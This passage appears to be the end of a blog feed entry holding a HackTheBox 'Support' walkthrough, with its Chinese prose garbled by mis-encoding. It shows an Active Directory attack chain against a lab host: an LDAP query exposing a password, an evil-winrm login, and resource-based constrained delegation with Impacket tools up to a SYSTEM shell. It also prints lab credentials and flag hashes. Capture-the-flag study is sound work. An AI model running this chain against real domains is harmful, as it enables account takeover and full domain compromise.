ç”¨æˆ·è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œæ‰¾ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯\n\næˆ‘ä»¬é¦–å…ˆæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯\n\n```bash\nâœ  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'\n```\n\nä¿¡æ¯å¤ªå¤šäº†â€¦\n\næˆ‘ä»¬å°è¯•æŸ¥ä¸€ä¸‹`SUPPORT` ç”¨æˆ·çš„ä¿¡æ¯\n\n```bash\nâœ  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'\n# extended LDIF                                     \n#                                  \n# LDAPv3     \n# base <CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL                                                                                                 \n#                                       \n                                                         \n# support, Users, support.htb\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support    \nc: US      \nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20220528111201.0Z\nuSNCreated: 12617\n**info: Ironside47pleasure40Watchful**\nmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb\nuSNChanged: 12630\ncompany: support\nstreetAddress: Skipper Bowles Dr\nname: support\nobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==\n```\n\nå…¶ä¸­çš„`info`å­—æ®µå¾ˆæœ‰è¶£ï¼Œå¯èƒ½å°±æ˜¯è¯¥ç”¨æˆ·çš„å‡­æ®\n\n```bash\ninfo: Ironside47pleasure40Watchful\n```\n\næµ‹è¯•å‡­æ®ï¼Œå‡å¦‚è¯¥å‡­æ®æœ‰æ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹`DC`è¿›è¡Œè¿œç¨‹äº†\n\n```bash\nâœ  Support nxc wmi 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful' -d support.htb\nRPC         10.10.11.174    135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nRPC         10.10.11.174    135    DC               [+] support.htb\\support:Ironside47pleasure40Watchful\n```\n\nè¯¥å‡­æ®æœ‰æ•ˆ\n\n```bash\nâœ  Support evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\support\\Documents> \n```\n\n`Support`ç”¨æˆ·`Desktop`æ–‡ä»¶å¤¹å¯ä»¥å¾—åˆ° `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\support\\Desktop> type user.txt\nd52f8d3f19ac0230628b1805483c760c\n```\n\n## æƒé™æå‡\n\né¦–å…ˆä½¿ç”¨ `Winpeas` èµ°ä¸€æ³¢ï¼Œæ²¡æœ‰å¾ˆå¤šçš„æœ‰ç”¨çš„ä¿¡æ¯\n\n`BloodHound`å†è¿›è¡Œåˆ†æï¼Œå‘ç°`Support`ç”¨æˆ·å¯¹`DC`æœ‰`GenericAll`æƒé™\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image5.png)\n\n### RBCD åŸºäºèµ„æºçº¦æŸå§”æ´¾\n\n`Support`ç”¨æˆ·å¯¹`DC`æœ‰`GenericAll`æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶`DC`\n\nè¿™é‡Œå¯ä»¥æ‰“ `RBCD`\n\né¦–å…ˆåˆ›å»ºè®¡ç®—æœºè´¦æˆ·\n\n```bash\nâœ  Support addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' -computer-name TEST\\$ -computer-pass 123456 -dc-host support.htb -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Successfully added machine account TEST$ with password 123456.\n```\n\n`RBCD` å§”æ´¾è®¾ç½®ï¼Œä»¥`support`çš„èº«ä»½ç™»å½•åˆ°`DC`ï¼Œä¿®æ”¹è®¡ç®—æœºè´¦æˆ·`DC$`çš„ä¸€ä¸ªå±æ€§`msDS-AllowedToActOnBehalfOfOtherIdentity` \n\n```bash\nâœ  Support rbcd.py support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.10.11.174 -action write -delegate-to DC\\$ -delegate-from TEST\\$ \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] TEST$ can now impersonate users on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     TEST$        (S-1-5-21-1677581083-3380853377-188903654-5601)\n```\n\næœ€ååˆ©ç”¨ `S4U` åè®®ä¼ªé€  `Administrator` ç”¨æˆ·ç”³è¯· `ST`\n\n```bash\nâœ  Support getST.py -spn cifs/DC.support.htb -impersonate administrator support.htb/TEST\\$:'123456' -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache\n```\n\n```bash\nâœ  Support export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache \n```\n\n```bash\nâœ  Support psexec.py support.htb/administrator@dc.support.htb -k -no-pass\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.support.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file niOpACUP.exe\n[*] Opening SVCManager on dc.support.htb.....\n[*] Creating service oDhJ on dc.support.htb.....\n[*] Starting service oDhJ.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.20348.859]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n```\n\nè¯»å– `root.txt`\n\n```bash\nC:\\Users\\Administrator\\Desktop> type root.txt\n89306b6f9ce190f011354f60b3342424\n```",
            "url": "https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support",
            "title": "HackTheBox - Machine - Support",
            "summary": "Machine Support https://app.hackthebox.com/machines/Support | Windows | Easy Medium Recon ç«¯å£ä¿¡æ¯ ä½¿ç”¨ nmap è¿›è¡Œæ‰«æ SMB æšä¸¾ æµ‹è¯•SMBæ˜¯å¦å…è®¸åŒ¿åç™»å½• å…è®¸åŒ¿åç™»å½•ï¼Œå¹¶ä¸”åœ¨support too...",
            "date_modified": "2025-06-05T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Windows",
                "RBCD",
                "Reverse"
            ]
        }
    ]
}